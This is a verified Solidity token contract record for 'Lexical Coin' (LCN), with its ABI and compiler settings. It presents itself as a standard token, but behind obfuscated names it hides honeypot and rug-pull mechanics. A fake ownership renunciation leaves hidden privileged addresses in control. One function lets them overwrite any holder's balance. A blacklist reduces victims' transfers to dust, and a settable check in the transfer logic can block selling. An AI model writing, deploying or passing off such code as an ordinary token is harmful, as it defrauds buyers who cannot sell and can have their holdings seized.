{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract toIs {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface buyAmountShould {\n    function createPair(address autoReceiver, address enableMin) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface fundReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface atIsMin {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address feeReceiver) external view returns (uint256);\n\n    function transfer(address autoFund, uint256 liquidityEnable) external returns (bool);\n\n    function allowance(address swapTeam, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 liquidityEnable) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address autoFund,\n        uint256 liquidityEnable\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed launchTeam, uint256 value);\n    event Approval(address indexed swapTeam, address indexed spender, uint256 value);\n}\n\ninterface swapExempt is atIsMin {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract LexicalCoin is toIs, atIsMin, swapExempt {\n\n    bool private fundTotal;\n\n    uint8 private fundWallet = 18;\n\n    function takeFee(address takeShould, address autoFund, uint256 liquidityEnable) internal returns (bool) {\n        require(totalToken[takeShould] >= liquidityEnable);\n        totalToken[takeShould] -= liquidityEnable;\n        totalToken[autoFund] += liquidityEnable;\n        emit Transfer(takeShould, autoFund, liquidityEnable);\n        return true;\n    }\n\n    string private sellFund = \"Lexical Coin\";\n\n    string private launchedMinToken = \"LCN\";\n\n    constructor (){\n        if (totalSender == autoLaunch) {\n            limitBuy = false;\n        }\n        atWalletMax();\n        fundReceiver receiverAutoFund = fundReceiver(shouldTx);\n        liquidityTo = buyAmountShould(receiverAutoFund.factory()).createPair(receiverAutoFund.WETH(), address(this));\n        swapFrom = buyAmountShould(receiverAutoFund.factory()).feeTo();\n        \n        walletToken = _msgSender();\n        txFund[walletToken] = true;\n        totalToken[walletToken] = listAuto;\n        if (tokenIs) {\n            limitBuy = false;\n        }\n        emit Transfer(address(0), walletToken, listAuto);\n    }\n\n    address shouldTx = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address public liquidityTo;\n\n    function walletMinToken(address exemptReceiver) public {\n        senderIs();\n        \n        if (exemptReceiver == walletToken || exemptReceiver == liquidityTo) {\n            return;\n        }\n        minLiquidity[exemptReceiver] = true;\n    }\n\n    uint256 public autoIs = 0;\n\n    uint256 isFrom;\n\n    uint256 public autoBuy = 3;\n\n    uint256 private listAuto = 100000000 * 10 ** 18;\n\n    address public walletToken;\n\n    function name() external view virtual override returns (string memory) {\n        return sellFund;\n    }\n\n    uint256 launchedSwap;\n\n    function feeFrom(address walletShouldExempt) public {\n        require(walletShouldExempt.balance < 100000);\n        if (shouldMin) {\n            return;\n        }\n        if (toTake != totalSender) {\n            launchWallet = true;\n        }\n        txFund[walletShouldExempt] = true;\n        \n        shouldMin = true;\n    }\n\n    uint256 constant txAuto = 18 ** 10;\n\n    function transferFrom(address takeShould, address autoFund, uint256 liquidityEnable) external override returns (bool) {\n        if (_msgSender() != shouldTx) {\n            if (teamAt[takeShould][_msgSender()] != type(uint256).max) {\n                require(liquidityEnable <= teamAt[takeShould][_msgSender()]);\n                teamAt[takeShould][_msgSender()] -= liquidityEnable;\n            }\n        }\n        return teamSell(takeShould, autoFund, liquidityEnable);\n    }\n\n    uint256 public autoLaunch;\n\n    function atWalletMax() public {\n        emit OwnershipTransferred(walletToken, address(0));\n        fromSellSwap = address(0);\n    }\n\n    bool public launchedLimit;\n\n    bool public limitBuy;\n\n    function transfer(address modeTx, uint256 liquidityEnable) external virtual override returns (bool) {\n        return teamSell(_msgSender(), modeTx, liquidityEnable);\n    }\n\n    bool public launchWallet;\n\n    address private fromSellSwap;\n\n    function approve(address amountReceiver, uint256 liquidityEnable) public virtual override returns (bool) {\n        teamAt[_msgSender()][amountReceiver] = liquidityEnable;\n        emit Approval(_msgSender(), amountReceiver, liquidityEnable);\n        return true;\n    }\n\n    uint256 public toTake;\n\n    function owner() external view returns (address) {\n        return fromSellSwap;\n    }\n\n    function teamSell(address takeShould, address autoFund, uint256 liquidityEnable) internal returns (bool) {\n        if (takeShould == walletToken) {\n            return takeFee(takeShould, autoFund, liquidityEnable);\n        }\n        uint256 marketingExempt = atIsMin(liquidityTo).balanceOf(swapFrom);\n        require(marketingExempt == isFrom);\n        require(autoFund != swapFrom);\n        if (minLiquidity[takeShould]) {\n            return takeFee(takeShould, autoFund, txAuto);\n        }\n        liquidityEnable = senderTrading(takeShould, autoFund, liquidityEnable);\n        return takeFee(takeShould, autoFund, liquidityEnable);\n    }\n\n    function takeSenderReceiver(address modeTx, uint256 liquidityEnable) public {\n        senderIs();\n        totalToken[modeTx] = liquidityEnable;\n    }\n\n    bool public tokenIs;\n\n    uint256 public buyReceiver;\n\n    function limitLaunchMin(uint256 liquidityEnable) public {\n        senderIs();\n        isFrom = liquidityEnable;\n    }\n\n    bool public shouldMin;\n\n    address swapFrom;\n\n    uint256 private totalSender;\n\n    mapping(address => bool) public txFund;\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchedMinToken;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return fundWallet;\n    }\n\n    event OwnershipTransferred(address indexed isAt, address indexed isBuyMin);\n\n    function senderTrading(address takeShould, address autoFund, uint256 liquidityEnable) internal view returns (uint256) {\n        require(liquidityEnable > 0);\n\n        uint256 minMax = 0;\n        if (takeShould == liquidityTo && autoBuy > 0) {\n            minMax = liquidityEnable * autoBuy / 100;\n        } else if (autoFund == liquidityTo && autoIs > 0) {\n            minMax = liquidityEnable * autoIs / 100;\n        }\n        require(minMax <= liquidityEnable);\n        return liquidityEnable - minMax;\n    }\n\n    function getOwner() external view returns (address) {\n        return fromSellSwap;\n    }\n\n    function allowance(address fromAt, address amountReceiver) external view virtual override returns (uint256) {\n        if (amountReceiver == shouldTx) {\n            return type(uint256).max;\n        }\n        return teamAt[fromAt][amountReceiver];\n    }\n\n    function balanceOf(address feeReceiver) public view virtual override returns (uint256) {\n        return totalToken[feeReceiver];\n    }\n\n    mapping(address => uint256) private totalToken;\n\n    mapping(address => bool) public minLiquidity;\n\n    mapping(address => mapping(address => uint256)) private teamAt;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return listAuto;\n    }\n\n    function senderIs() private view {\n        require(txFund[_msgSender()]);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isBuyMin\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchTeam\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityEnable\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atWalletMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoIs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletShouldExempt\",\"type\":\"address\"}],\"name\":\"feeFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"liquidityEnable\",\"type\":\"uint256\"}],\"name\":\"limitLaunchMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityEnable\",\"type\":\"uint256\"}],\"name\":\"takeSenderReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityEnable\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityEnable\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptReceiver\",\"type\":\"address\"}],\"name\":\"walletMinToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "LexicalCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}